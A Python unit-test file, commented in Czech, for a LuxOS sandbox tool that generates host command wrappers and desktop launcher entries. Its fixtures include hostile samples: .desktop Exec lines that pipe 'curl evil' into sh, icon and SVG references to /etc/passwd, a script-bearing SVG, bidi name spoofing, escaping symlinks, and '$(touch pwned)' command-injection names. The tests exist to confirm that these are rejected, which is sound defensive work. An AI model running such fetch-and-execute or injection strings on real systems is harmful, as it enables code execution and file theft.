#!/usr/bin/env python3
"""Spoustece aplikaci sandboxu na hostiteli (luxos-sandbox sync-launchers) - bez root, bez bwrap.

    python3 packages/luxos-sandbox/tests/test_launchers.py -v

Testovaci koren sandboxu (jen databaze balicku, .desktop soubory, ikony a symlinky) je v docasnem
adresari; luxos-sandbox ze zdrojoveho stromu bezi v testovacim rezimu (LUXOS_SANDBOX_TESTING=1,
LUXOS_SANDBOX_BASE), XDG_DATA_HOME a HOME jsou docasne. Skutecny sandbox uzivatele
(/var/lib/luxos/sandbox) se nikdy necte ani nemeni, nic se nespousti pres pkexec/sudo ani bwrap.
Overuje: obaly prikazu, polozky Launchpadu, bezpecne prevzeti nazvu a ikon (symlinky, podvrzene
.desktop a ikony), odstraneni zastaralych, poradi v PATH (prikaz systemu vyhraje), napovedu
"command not found".
"""
import json
import os
import pwd
import shutil
import struct
import subprocess
import sys
import tempfile
import unittest
import zlib

sys.dont_write_bytecode = True
HERE = os.path.dirname(os.path.abspath(__file__))
CLI = os.path.join(HERE, "..", "files", "luxos-sandbox")
SHELL_PATH = os.path.join(HERE, "..", "..", "luxos-shell", "files", "sandbox-path.sh")
USER = pwd.getpwuid(os.getuid()).pw_name


def png(w, h):
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
    raw = b"".join(b"\0" + b"\0\0\0\0" * w for _ in range(h))
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))


class Launchers(unittest.TestCase):
    def setUp(self):
        self.t = tempfile.mkdtemp(prefix="luxos-sandbox-launchers-")
        self.base = os.path.join(self.t, "base")
        self.root = os.path.join(self.base, USER)
        self.home = os.path.join(self.t, "home")
        self.data = os.path.join(self.home, ".local", "share")
        self.sysbin = os.path.join(self.t, "sysbin")      # "system" hostitele (prikazy, ktere uz existuji)
        for d in (os.path.join(self.root, "usr", "bin"), os.path.join(self.root, "var", "lib", "pacman", "local"),
                  os.path.join(self.root, "usr", "share", "applications"), self.data, self.sysbin):
            os.makedirs(d)
        os.chmod(self.base, 0o755)
        os.chmod(self.root, 0o700)
        self.outside = os.path.join(self.t, "host-secret")
        with open(self.outside, "w") as f:
            f.write("SECRET-HOST-FILE\n")
        self.bin = os.path.join(self.data, "luxos", "sandbox", "bin")
        self.apps = os.path.join(self.data, "applications")
        self.env = {"PATH": self.sysbin + ":/usr/bin:/bin", "HOME": self.home, "XDG_DATA_HOME": self.data,
                    "XDG_RUNTIME_DIR": os.path.join(self.t, "run"), "LANG": "C.UTF-8",
                    "LUXOS_SANDBOX_TESTING": "1", "LUXOS_SANDBOX_BASE": self.base,
                    "LUXOS_SANDBOX_SHARED": os.path.join(self.t, "shared"), "PYTHONDONTWRITEBYTECODE": "1"}

    def tearDown(self):
        shutil.rmtree(self.t, ignore_errors=True)

    # ---- testovaci koren -----------------------------------------------------------
    def r(self, rel):
        return os.path.join(self.root, rel)

    def write(self, rel, data, mode=0o644):
        p = self.r(rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "wb") as f:
            f.write(data if isinstance(data, bytes) else data.encode())
        os.chmod(p, mode)

    def package(self, name, files, explicit=True, ver="1.0-1", create_bins=True):
        entry = f"var/lib/pacman/local/{name}-{ver}"
        desc = f"%NAME%\n{name}\n\n%VERSION%\n{ver}\n\n"
        if not explicit:
            desc += "%REASON%\n1\n\n"
        self.write(entry + "/desc", desc)
        self.write(entry + "/files", "%FILES%\n" + "".join(f + "\n" for f in files) + "\n")
        if create_bins:
            for f in files:
                if f.startswith("usr/bin/") and len(f) > 8 and not os.path.lexists(self.r(f)):
                    self.write(f, "#!/bin/sh\necho in-sandbox\n", 0o755)

    def desktop(self, rel, body):
        self.write("usr/share/applications/" + rel, "[Desktop Entry]\n" + body)

    def sandbox(self, *args, env=None):
        e = dict(self.env, **(env or {}))
        r = subprocess.run([sys.executable, CLI, *args], env=e, capture_output=True, text=True,
                           stdin=subprocess.DEVNULL, timeout=60)
        return r.returncode, r.stdout + r.stderr

    def sync(self):
        rc, out = self.sandbox("sync-launchers", "--json")
        self.assertEqual(rc, 0, out)
        return json.loads(out)

    def read(self, path):
        with open(path, encoding="utf-8") as f:
            return f.read()

    # ---- testy -------------------------------------------------------------------------
    def test_cli_wrapper_only_for_explicit_apps(self):
        # (prikaz "pi-sbx" misto "pi": na hostiteli muze byt skutecny /usr/bin/pi - ten by vyhral)
        # prikaz je v sandboxu symlink (jako u balicku z npm) - to je v poradku, cil se nenasleduje
        os.makedirs(self.r("usr/lib/node_modules/pi"))
        os.symlink("../lib/node_modules/pi/cli.js", self.r("usr/bin/pi-sbx"))
        self.package("pi-coding-agent-bin", ["usr/", "usr/bin/", "usr/bin/pi-sbx"])
        self.package("nodejs", ["usr/bin/node"], explicit=False)          # zavislost
        self.package("nano", ["usr/bin/nano"])                            # zakladni system
        self.package("git", ["usr/bin/git-sandboxonly"])                  # nastroje pro sestaveni
        out = self.sync()
        self.assertEqual([a["package"] for a in out["apps"]], ["pi-coding-agent-bin"])
        self.assertEqual(out["apps"][0]["commands"], ["pi-sbx"])
        self.assertEqual(out["apps"][0]["gui"], [])
        self.assertEqual(sorted(os.listdir(self.bin)), ["pi-sbx"])
        w = os.path.join(self.bin, "pi-sbx")
        self.assertEqual(os.stat(w).st_mode & 0o777, 0o755)
        self.assertIn('exec /usr/bin/luxos-sandbox run --net --launcher -- /usr/bin/pi-sbx "$@"', self.read(w))
        self.assertNotIn("--gui", self.read(w))

    def test_system_command_wins_and_is_not_wrapped(self):
        self.package("tool-a", ["usr/bin/tool-a"])
        self.package("tool-b", ["usr/bin/tool-b"])
        with open(os.path.join(self.sysbin, "tool-b"), "w") as f:
            f.write("#!/bin/sh\necho system\n")
        os.chmod(os.path.join(self.sysbin, "tool-b"), 0o755)
        self.sync()
        self.assertEqual(sorted(os.listdir(self.bin)), ["tool-a"])

    def test_path_order_system_wins(self):
        """sandbox-path.sh (luxos-shell): slozka obalu vzdy na KONCI PATH, prikaz systemu vyhraje."""
        self.package("dup-cmd", ["usr/bin/dup-cmd"])
        self.sync()
        later = os.path.join(self.t, "later")       # prikaz, ktery se do systemu nainstaluje az pozdeji
        os.makedirs(later)
        script = ('. "$1"; first=${PATH%%:*}; last=${PATH##*:}; '
                  'printf "%s\\n%s\\n%s\\n" "$last" "$(command -v dup-cmd)" "$PATH"')
        for shell in ("bash", "zsh"):
            if not shutil.which(shell):
                continue
            with self.subTest(shell=shell):
                # obal uz v PATH uprostred (napr. stara relace) - presune se na konec
                env = dict(self.env, PATH=f"{self.bin}:{self.sysbin}:/usr/bin:/bin")
                r = subprocess.run([shell, "-c", script, "x", SHELL_PATH], env=env, capture_output=True, text=True)
                last, found, path = r.stdout.splitlines()
                self.assertEqual(last, self.bin, r.stdout + r.stderr)
                self.assertEqual(found, os.path.join(self.bin, "dup-cmd"))
                self.assertEqual(path.split(":").count(self.bin), 1)
                with open(os.path.join(later, "dup-cmd"), "w") as f:
                    f.write("#!/bin/sh\n")
                os.chmod(os.path.join(later, "dup-cmd"), 0o755)
                env["PATH"] = f"{later}:/usr/bin:/bin"
                r = subprocess.run([shell, "-c", script, "x", SHELL_PATH], env=env, capture_output=True, text=True)
                last, found, path = r.stdout.splitlines()
                self.assertEqual(last, self.bin)
                self.assertEqual(found, os.path.join(later, "dup-cmd"))
                # opakovane nacteni nic nezdvoji
                r = subprocess.run([shell, "-c", '. "$1"; . "$1"; echo "$PATH"', "x", SHELL_PATH], env=env,
                                   capture_output=True, text=True)
                self.assertEqual(r.stdout.strip().split(":").count(self.bin), 1)
                os.unlink(os.path.join(later, "dup-cmd"))

    def test_gui_app_gets_launchpad_entry(self):
        self.package("foo-app", ["usr/bin/fooapp", "usr/bin/foo-helper", "usr/share/applications/org.foo.App.desktop",
                                 "usr/share/icons/hicolor/64x64/apps/org.foo.App.png"])
        self.desktop("org.foo.App.desktop",
                     "Type=Application\nName=Foo App\nName[cs]=Foo Aplikace\nComment=Edits foos\n"
                     "Exec=env GDK_BACKEND=x11 fooapp --new-window %U\nIcon=org.foo.App\n"
                     "Categories=Graphics;2DGraphics;X-Evil;\nMimeType=text/plain;\nX-Evil=1\nTryExec=evil\n")
        self.write("usr/share/icons/hicolor/64x64/apps/org.foo.App.png", png(64, 64))
        out = self.sync()
        app = out["apps"][0]
        self.assertEqual(app["gui"], [{"name": "Foo App (Sandbox)", "command": "fooapp"}])
        self.assertEqual(sorted(app["commands"]), ["foo-helper", "fooapp"])
        self.assertIn("run --gui --net --launcher -- /usr/bin/fooapp", self.read(os.path.join(self.bin, "fooapp")))
        self.assertNotIn("--gui", self.read(os.path.join(self.bin, "foo-helper")))
        d = self.read(os.path.join(self.apps, "luxos-sandbox-app-foo-app--org.foo.App.desktop"))
        lines = d.splitlines()
        self.assertIn("Name=Foo App (Sandbox)", lines)
        self.assertIn("Comment=Edits foos", lines)
        self.assertIn("Exec=/usr/bin/luxos-sandbox run --gui --net --launcher -- /usr/bin/fooapp", lines)
        self.assertIn("Categories=Graphics;", lines)
        icon = os.path.join(self.data, "luxos", "sandbox", "icons", "luxos-sandbox-app-foo-app--org.foo.App.png")
        self.assertIn("Icon=" + icon, lines)
        with open(icon, "rb") as f:
            self.assertEqual(f.read(), png(64, 64))
        for bad in ("MimeType", "X-Evil", "TryExec", "%U", "GDK_BACKEND", "new-window"):
            self.assertNotIn(bad, d)
        # prelozeny nazev z .desktop souboru podle jazyka uzivatele, pripona prelozena luxos-i18n
        self.sandbox("sync-launchers", env={"LANG": "cs_CZ.UTF-8"})
        d = self.read(os.path.join(self.apps, "luxos-sandbox-app-foo-app--org.foo.App.desktop"))
        self.assertIn("Name=Foo Aplikace", d)

    def test_terminal_and_hidden_desktop_files_are_cli_only(self):
        self.package("tui-tool", ["usr/bin/tui-tool", "usr/share/applications/tui.desktop",
                                  "usr/share/applications/hidden.desktop"])
        self.desktop("tui.desktop", "Type=Application\nName=TUI\nExec=tui-tool\nTerminal=true\n")
        self.desktop("hidden.desktop", "Type=Application\nName=Hidden\nExec=tui-tool\nNoDisplay=true\n")
        out = self.sync()
        self.assertEqual(out["apps"][0]["gui"], [])
        self.assertEqual(out["apps"][0]["commands"], ["tui-tool"])
        self.assertFalse([n for n in os.listdir(self.apps) if n.startswith("luxos-sandbox-app-")])

    def test_malicious_desktop_entries(self):
        files = ["usr/bin/goodcmd", "usr/share/applications/inject.desktop", "usr/share/applications/link.desktop",
                 "usr/share/applications/bidi.desktop"]
        self.package("evil-app", files)
        # escape \n v hodnote, rizeni terminalu a obousmerny text, Exec s jinym programem a shellem
        self.desktop("inject.desktop",
                     "Type=Application\nName=Nice\\nExec=curl evil|sh\x1b[31m\nComment=a\\\\b\x07\n"
                     "Exec=sh -c 'curl http://evil | sh'; goodcmd\nIcon=../../../../etc/passwd\n")
        self.desktop("bidi.desktop", "Type=Application\nName=Bank‮gnp.exe\nExec=goodcmd\nIcon=/etc/hostname\n")
        os.symlink(self.outside, self.r("usr/share/applications/link.desktop"))     # .desktop mimo koren
        out = self.sync()
        gui = out["apps"][0]["gui"]
        self.assertEqual(len(gui), 2, gui)
        for name in os.listdir(self.apps):
            d = self.read(os.path.join(self.apps, name))
            execs = [x for x in d.splitlines() if x.startswith("Exec=")]
            self.assertEqual(execs, ["Exec=/usr/bin/luxos-sandbox run --gui --net --launcher -- /usr/bin/goodcmd"])
            self.assertNotIn("\x1b", d)
            self.assertNotIn("\x07", d)
            self.assertNotIn("‮", d)
            self.assertNotIn("SECRET", d)
            self.assertIn("Icon=luxos-sandbox", d)      # zadna ikona mimo koren -> ikona Sandboxu
            self.assertEqual(sum(1 for x in d.splitlines() if x.startswith("Name=")), 1)

    def test_symlinked_directories_are_not_followed(self):
        # cela slozka applications je symlink ven ze sandboxu -> nic se neprecte
        host_apps = os.path.join(self.t, "host-apps")
        os.makedirs(host_apps)
        with open(os.path.join(host_apps, "x.desktop"), "w") as f:
            f.write("[Desktop Entry]\nType=Application\nName=FromHost\nExec=x-cmd\n")
        shutil.rmtree(self.r("usr/share/applications"))
        os.symlink(host_apps, self.r("usr/share/applications"))
        self.package("x-app", ["usr/bin/x-cmd", "usr/share/applications/x.desktop"])
        out = self.sync()
        self.assertEqual(out["apps"][0]["gui"], [])
        # databaze balicku jako symlink ven -> zadne aplikace
        fake_db = os.path.join(self.t, "fake-db")
        shutil.copytree(self.r("var/lib/pacman/local"), fake_db)
        shutil.rmtree(self.r("var/lib/pacman/local"))
        os.symlink(fake_db, self.r("var/lib/pacman/local"))
        self.assertEqual(self.sync()["apps"], [])
        self.assertEqual(os.listdir(self.bin), [])

    def test_malicious_icons_rejected(self):
        files = ["usr/bin/c1", "usr/bin/c2", "usr/bin/c3", "usr/bin/c4", "usr/bin/c5"]
        for i in range(1, 6):
            files.append(f"usr/share/applications/a{i}.desktop")
        self.package("icon-app", files)
        icons = "usr/share/icons/hicolor/scalable/apps/"
        pix = "usr/share/pixmaps/"
        os.makedirs(self.r(icons))
        os.makedirs(self.r(pix))
        os.symlink(self.outside, self.r(pix + "i1.png"))                                  # symlink ven
        self.write(icons + "i2.svg", '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')
        self.write(icons + "i3.svg", '<svg><image href="file:///etc/passwd"/></svg>')    # cteni z disku
        self.write(pix + "i4.png", png(5000, 5000)[:4096])                                # obri rozmery
        self.write(pix + "i5.png", b"not a png" * 10)
        for i in range(1, 6):
            self.desktop(f"a{i}.desktop", f"Type=Application\nName=App{i}\nExec=c{i}\nIcon=i{i}\n")
        os.mkfifo(self.r(icons + "i5.svg"))                                               # FIFO nesmi zaseknout
        self.sync()
        icon_dir = os.path.join(self.data, "luxos", "sandbox", "icons")
        self.assertEqual(os.listdir(icon_dir), [])
        for i in range(1, 6):
            d = self.read(os.path.join(self.apps, f"luxos-sandbox-app-icon-app--a{i}.desktop"))
            self.assertIn("Icon=luxos-sandbox\n", d)
        # bezpecne SVG s vnitrnim odkazem projde
        self.write(icons + "i2.svg", '<svg xmlns="http://www.w3.org/2000/svg"><defs><g id="a"/></defs>'
                                     '<use href="#a"/></svg>')
        self.sync()
        self.assertEqual(os.listdir(icon_dir), ["luxos-sandbox-app-icon-app--a2.svg"])

    def test_bad_names_and_protected_commands(self):
        self.package("bad-names", ["usr/bin/$(touch pwned)", "usr/bin/-rf", "usr/bin/.hidden", "usr/bin/sudo",
                                   "usr/bin/luxos-sandbox", "usr/bin/pkexec", "usr/bin/ok-cmd", "usr/bin/a b",
                                   "usr/bin/sub/dir", "usr/bin/ghost"], create_bins=False)
        for c in ("$(touch pwned)", "-rf", ".hidden", "sudo", "luxos-sandbox", "pkexec", "ok-cmd", "a b"):
            self.write("usr/bin/" + c, "#!/bin/sh\n", 0o755)
        # neplatna jmena balicku / polozek databaze
        self.write("var/lib/pacman/local/..evil-1-1/desc", "%NAME%\n..evil\n")
        self.write("var/lib/pacman/local/Upper-1-1/desc", "%NAME%\nUpper\n")
        self.write("var/lib/pacman/local/other-1-1/desc", "%NAME%\nnot-other\n")
        out = self.sync()
        self.assertEqual([a["package"] for a in out["apps"]], ["bad-names"])
        self.assertEqual(sorted(os.listdir(self.bin)), ["ok-cmd"])      # ghost v sandboxu neni
        self.assertFalse(os.path.exists(os.path.join(self.t, "pwned")))

    def test_stale_launchers_removed_foreign_files_kept(self):
        self.package("gone-app", ["usr/bin/gone", "usr/share/applications/gone.desktop"])
        self.desktop("gone.desktop", "Type=Application\nName=Gone\nExec=gone\n")
        self.sync()
        own = os.path.join(self.bin, "my-own-script")                  # vlastni soubory uzivatele
        with open(own, "w") as f:
            f.write("#!/bin/sh\necho mine\n")
        mine = os.path.join(self.apps, "luxos-sandbox-app-handmade.desktop")
        with open(mine, "w") as f:
            f.write("[Desktop Entry]\nName=Mine\n")
        other = os.path.join(self.apps, "firefox.desktop")
        with open(other, "w") as f:
            f.write("[Desktop Entry]\nName=Firefox\n")
        self.assertTrue(os.path.exists(os.path.join(self.bin, "gone")))
        shutil.rmtree(self.r("var/lib/pacman/local/gone-app-1.0-1"))
        self.sync()
        self.assertEqual(sorted(os.listdir(self.bin)), ["my-own-script"])
        self.assertEqual(sorted(os.listdir(self.apps)), ["firefox.desktop", "luxos-sandbox-app-handmade.desktop"])
        # smazany sandbox (destroy): vse vlastni pryc
        self.package("again", ["usr/bin/again"])
        self.sync()
        self.assertIn("again", os.listdir(self.bin))
        shutil.rmtree(self.root)
        # obal spusteny po smazani sandboxu: srozumitelna chyba a uklid spoustecu
        rc, out = self.sandbox("run", "--net", "--launcher", "--", "/usr/bin/again")
        self.assertEqual(rc, 1, out)
        self.assertIn("luxos-sandbox create", out)
        self.assertEqual(sorted(os.listdir(self.bin)), ["my-own-script"])
        rc, out = self.sandbox("sync-launchers", "--quiet")
        self.assertEqual(rc, 0, out)
        self.assertEqual(out, "")
        self.assertEqual(sorted(os.listdir(self.bin)), ["my-own-script"])

    def test_idempotent(self):
        self.package("idem", ["usr/bin/idem", "usr/share/applications/idem.desktop"])
        self.desktop("idem.desktop", "Type=Application\nName=Idem\nExec=idem\n")
        self.sync()
        paths = [os.path.join(self.bin, "idem"), os.path.join(self.apps, "luxos-sandbox-app-idem--idem.desktop")]
        before = [os.stat(p).st_mtime_ns for p in paths]
        appdir = os.stat(self.apps).st_mtime_ns
        self.sync()
        self.assertEqual([os.stat(p).st_mtime_ns for p in paths], before)
        self.assertEqual(os.stat(self.apps).st_mtime_ns, appdir)       # Launchpad nic neprepocita

    def test_command_hint(self):
        self.package("pi-coding-agent-bin", ["usr/bin/pi-test"])
        self.package("nodejs", ["usr/bin/node-test"], explicit=False)
        # obal chybi (sandbox z doby pred aktualizaci), stary terminal bez slozky v PATH
        rc, out = self.sandbox("__command-hint", "pi-test")
        self.assertEqual(rc, 0, out)
        self.assertIn("luxos-sandbox run --net -- pi-test", out)
        self.assertIn("new terminal", out)
        self.assertTrue(os.path.exists(os.path.join(self.bin, "pi-test")))   # obal hned vznikl
        rc, out = self.sandbox("__command-hint", "pi-test", env={"PATH": self.env["PATH"] + ":" + self.bin})
        self.assertEqual(rc, 0, out)
        self.assertIn("Start it with: pi-test", out)
        # zavislost, neznamy prikaz, neplatne jmeno -> zadna napoveda
        for cmd in ("node-test", "nope", "../x", "$(id)"):
            rc, out = self.sandbox("__command-hint", cmd)
            self.assertEqual(rc, 1, cmd)
            self.assertEqual(out, "")

    def test_has_app(self):
        self.package("pi-coding-agent-bin", ["usr/bin/pi"])
        self.package("nodejs", ["usr/bin/node"], explicit=False)
        self.assertEqual(self.sandbox("__has-app", "pi-coding-agent-bin")[0], 0)
        self.assertEqual(self.sandbox("__has-app", "nodejs")[0], 1)
        self.assertEqual(self.sandbox("__has-app", "../x")[0], 2)


if __name__ == "__main__":
    unittest.main()
